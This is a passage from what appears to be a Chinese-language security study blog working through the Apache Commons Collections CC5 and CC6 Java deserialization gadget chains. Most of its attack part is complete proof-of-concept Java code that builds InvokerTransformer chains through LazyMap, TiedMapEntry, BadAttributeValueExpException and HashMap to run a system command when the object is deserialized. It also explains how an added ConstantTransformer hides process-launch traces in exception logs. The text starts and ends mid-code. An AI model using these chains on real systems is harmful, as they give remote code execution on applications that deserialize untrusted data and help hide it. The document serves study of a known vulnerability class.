class_">TiedMapEntry</span>(lazy1,<span class="string">&quot;fupanc1&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(haha1,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="comment">//错误点</span></span><br><span class="line">        hash1.remove(<span class="string">&quot;fupanc1&quot;</span>);</span><br><span class="line">        hash0.remove(<span class="string">&quot;fupanc0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码有问题，在运行后应该时成功在put部分弹出计算机，这说明代码逻辑应该没问题，并且跟源码发现前面确实在按预期走，在弹出计算机后在后面的<code>InstantiateTransformer#transforme</code>的catch的var6部分后一点突然结束了，<strong>导致程序直接结束</strong>，让后面的remove和序列化等操作都无法实现，有点怪，先遗留这个问题，等后面学深了再来想。</p>
<p>除了上面无法全部运行的问题，还有看代码，其实可以说是多此一举了，定义了两个TiedMapEntry来实现，就简单了解一下就行了。</p>
<h3 id="正式学习"><a href="#正式学习" class="headerlink" title="正式学习"></a>正式学习</h3><p>继续看源码，我们看BadAttributeValueExpException的readObject()方法，这里也利用了toString()方法：</p>
<p><img src="/2024/08/13/CC5/image-20240731165921565.png" alt="image-20240731165921565"></p>
<p>看这个readObject()方法，<code>valObj</code>是从<code>gf</code>中的<code>val</code>参数获取的，而<code>gf</code>又是从反序列化流中读取的。所以我们只要控制了<code>BadAttributeValueExpException</code>类的<code>val</code>参数，就相当于控制了<code>valObj</code>，所以我们<strong>这里需要将val设置为TiedMapEntry类的实例。</strong></p>
<p><img src="/2024/08/13/CC5/image-20240731182028531.png" alt="image-20240731182028531"></p>
<p>继续看代码，只要我们传入的<code>val</code>的值不是String类型，并且符合第三个条件中的的任意一个，就可以成功进入第三个条件的语句，从而可以执行<code>TiedMapEntry</code>类的<code>toString()</code>方法。</p>
<p>在java中，<code>Sysyem.getSecurityManager()</code>的返回值默认是null，看如下测试语句：</p>
<p><img src="/2024/08/13/CC5/image-20240731213103870.png" alt="image-20240731213103870"></p>
<p>所以一般是可以进入到这个语句的。</p>
<p>那么现在就差构造了，思路就是将一个设置好了的<code>TiedMapEntry</code>类传给<code>val</code>就行，结合前面学过的代码，可以先随便传，再反射修改即可，所以可以如下构造代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chainPart);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(hash,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">x</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        x.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        x.set(o,outerMap);</span><br><span class="line">        </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机。</p>
<p>同样的如果你想使用其他类型，比如结合动态加载字节码之类的，基本都是只用改一下<code>chainPart</code>那里的链就行。</p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul>
<li>子父类的序列化问题</li>
</ul>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java反序列化调用链分析</category>
        <category>CC5</category>
      </categories>
  </entry>
  <entry>
    <title>CC6</title>
    <url>/2024/08/13/CC6/</url>
    <content><![CDATA[<p>CC6学习</p>
<span id="more"></span>

<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><p>在CC1已经说过了，在JDK 8u71以后，官方修改了<code>AnnotationInvocationHandler</code>的readObject()方法，导致CC1不能再利用。</p>
<p>所以现在需要找寻新的利用链用于解决高版本Java的问题，现在先来看这个利用链。</p>
<p><strong>测试环境</strong></p>
<ul>
<li>JDK 8u411</li>
<li>commons-collections 3.2.1</li>
</ul>
<h2 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h2><p>在前面的CC1的LazyMap链中利用的就是<code>get()</code>方法，那么现在其实还可以寻找在上下文中是否还有其他调用<code>LazyMap#get()</code>的类，并且要求这个可利用的类实现了Serializable接口。<br>在这里找到的类是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>，重点就是下面的两个方法，分别是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//getValue()</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//hashCode()</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这里可以看到在hashCode()方法中调用了getValue()方法，在getValue()方法中的<code>this.map.get(this.key);</code>，只要这里可以将this.map的值设置为LazyMap的实例，就又可以成为一个利用链的起始点。</p>
<p>所以现在需要先找到可以使用什么类来触发<code>TiedMapEntry#hashCode()</code>方法，在这里，同样的有两条链子，分别是HashMap和HashSet</p>
<h3 id="利用HashMap"><a href="#利用HashMap" class="headerlink" title="利用HashMap"></a>利用HashMap</h3><h4 id="利用链代码审计"><a href="#利用链代码审计" class="headerlink" title="利用链代码审计"></a>利用链代码审计</h4><p>此时我想到了URLDNS链，其中有一个步骤调用了hashCode()方法，如下：<br><img src="/2024/08/13/CC6/image-20240727213424040.png" alt="image-20240727213424040"></p>
<p>这里就是调用的key的hashCode方法，在URLDNS中的这个key对应的是URL类实例，所以URLDNS中调用的是URL类的hashCode()方法，那么现在其实也比较简单了，先大概想一下流程：</p>
<ul>
<li>这里肯定是用HashMap作为序列化以及反序列化的对象</li>
<li>很简单了，然后在反序的时候自然会到hash()方法，此时我们需要在要序列化的代码中<code>put</code>进一个key为<code>TiedMapEntry</code>类的实例，让这个key等于<code>TiedMapEntry</code>对象，这样就会顺利调用到<code>TiedMapEntry</code>类的<code>hashCode()</code>方法，然后再将<code>TiedMapEntry</code>类里面的<code>map</code>设置为LazyMap类的实例，这样就会成功调用到<code>LazyMap</code>类的<code>get</code>方法，后面就是CC1中提过的了。</li>
</ul>
<p>流程基本清楚，现在就是如何设计代码了</p>
<p>然后就是看如何传入基本盘了，基本盘如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//基本盘</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Retention.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在就是需要将这个基本盘传入TiedMapEntry类，看一下这个类的构造方法：</p>
<p><img src="/2024/08/13/CC6/image-20240727222829688.png" alt="image-20240727222829688"></p>
<p>都是public，那么直接引入即可，所以这里的利用代码就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(<span class="literal">null</span>,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(o,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>报错显示在实例化LazyMap那里不能传入null，</p>
<p><img src="/2024/08/13/CC6/image-20240728002358043.png" alt="image-20240728002358043"></p>
<p>那么我就再创一个HashMap实例进去赋值，那么测试代码就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(haha,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(o,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="/2024/08/13/CC6/image-20240728002522587.png" alt="image-20240728002522587"></p>
<p>虽然成功弹出计算机，本来也以为只是平常的报错，然后去看了一下其他文章，发现是自己的<strong>代码有问题</strong>，首先就是在<code>hashMap.put()</code>，本身的put()方法就是与<code>HashMap#readObject()</code>的部分源码相同：</p>
<p><img src="/2024/08/13/CC6/image-20240728112501469.png" alt="image-20240728112501469"></p>
<p><u>这样在put时就会触发一次利用链，这也是为什么会弹出计算机的原因</u>（后面会说这个的解决方法）。</p>
<p>再来看这个报错内容：</p>
<p><img src="/2024/08/13/CC6/image-20240728112639545.png" alt="image-20240728112639545"></p>
<p>这个报错内容显示我在序列化过程中试图序列化一个不可序列化的<code>exec</code>执行后返回的<code>Process</code>对象，然后前面的CC1却没有报这样的错，这里就看看差别(gpt4o的回答+个人理解，仅供参考)：</p>
<ul>
<li><p><u>对于前面的错误代码</u>：首先就是我们new了一个HashMap实例，然后我们往里面put进了一个<code>TiedMapEntry</code>类实例，而<strong>在序列化<code>HashMap</code>时，会遍历 <code>HashMap</code> 中的每个 <code>Map.Entry</code> 对象（即键值对），并序列化每个键值对，而对于每个 <code>Map.Entry</code>，<code>ObjectOutputStream</code> 会调用它们的 <code>getKey()</code> 和 <code>getValue()</code> 方法来获取键和值，以便对它们进行序列化，然后ObjectOutputStream的writeObject方法就会尝试去序列化</strong>。</p>
<p>然后由于我们设置的值，传入了<code>TiedMapEntry</code>类实例，在调用<code>getValue()</code>后会进入LazyMap的get()方法从而导致整条利用链的进行，然后<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>，<strong>这个调用会尝试启动一个新进程</strong>，返回一个不可序列化的 <code>Process</code> 对象。用一个代码测试一下是否会遍历：</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">x</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        o.put(x,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：<br><img src="/2024/08/13/CC6/image-20240728164050713.png" alt="image-20240728164050713"></p>
<p>说明确实在HashMap序列化的时候会遍历条目并调用writeObject()方法对其进行序列化，如果要序列化的对象没有定义writeObject()方法，就会调用默认的writeObject()方法去序列化它（对于默认个人理解应该是ObjectOutputStream的writeObject方法）。</p>
<p>结合前面的解释，那么就是由于调用了<code>TiedMapEntry</code>的<code>getValue()</code>方法，然后进行链式反应，最终会返回一个<code>Process</code>对象作为这个”value”，但是由于这个对象是不可被序列化的，所以最终会报错不可被序列化。</p>
<ul>
<li><u>那么对于CC1中的LazyMap链</u>：那里通过使用 <code>AnnotationInvocationHandler</code> 代理包装 <code>LazyMap</code>，<strong>避免在序列化过程中触发变换器链</strong>，避免了异常。</li>
</ul>
<p>——————</p>
<p>那么对于这个问题的解决方法，ysoserial早在CC1中就有了优化：<br><img src="/2024/08/13/CC6/image-20240728201220911.png" alt="image-20240728201220911"></p>
<p><img src="/2024/08/13/CC6/image-20240728212955708.png" alt="image-20240728212955708"></p>
<p>它这里是最后才将恶意transformers数组设置到transformerChain中，解决问题的方法就在这里。</p>
<p>同时注意看基本盘代码里面，添加了一个<code>ConstantTransformer(1)</code>，这是为了隐藏异常日志中的信息，<strong>起到了隐蔽启动进程的日志特征的作用</strong>。以CC1为例看一下使用过后的差别：<br>使用前的特征：</p>
<p><img src="/2024/08/13/CC6/image-20240728213330395.png" alt="image-20240728213330395"></p>
<p>使用后的特征：</p>
<p><img src="/2024/08/13/CC6/image-20240728213433801.png" alt="image-20240728213433801"></p>
<p>使用后同样成功弹出计算机，但是这里的异常日志特征已经被改变了。</p>
<p><strong>解决方法就在里面</strong>，所以我们可以在利用链的最后加上一个<code>new ConstantTransformer(1)</code>，熟悉这个类的transformer()方法就可以知道，这里不会管传入的<code>input</code>，这里就会直接返回一个<code>1</code>，再结合正常的例如<code>put(1,&quot;xxx&quot;)</code>这种，这样在序列化时就不会报无法序列化的错误，同时也可以起到隐藏日志的作用。</p>
<p>所以修改后的POC为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> 